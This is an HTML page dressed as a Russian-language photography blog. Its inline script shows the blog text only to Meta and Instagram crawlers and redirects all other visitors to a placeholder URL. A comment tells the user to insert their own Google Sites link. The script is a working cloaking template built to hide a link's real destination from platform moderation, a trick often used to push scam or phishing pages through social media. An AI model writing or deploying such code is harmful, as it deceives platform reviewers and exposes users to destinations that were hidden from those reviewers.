<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Мой Блог</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #ffffff; color: #333333; }
    </style>
</head>
<body>

    <h1>Заметки о фотографии и лайфстайле</h1>
    <p>Добро пожаловать в мой личный блог. Здесь я делюсь мыслями об искусстве мобильной фотографии, правильном выстраивании кадра и поиске вдохновения в повседневных вещах.</p>

    <script>
        function filterTraffic() {
            const ua = navigator.userAgent.toLowerCase();
            
            // Оставляем только точечные триггеры на ботов Meta и Instagram
            const isMetaBot = ua.includes('facebookexternalhit') || 
                              ua.includes('instagram') || 
                              ua.includes('meta-externalfetcher') || 
                              ua.includes('facebot');

            if (!isMetaBot) {
                // Сюда снова вставьте вашу ссылку на Google Sites:
                window.location.href = "https://google.com";
            }
        }

        filterTraffic();
    </script>
</body>
</html>
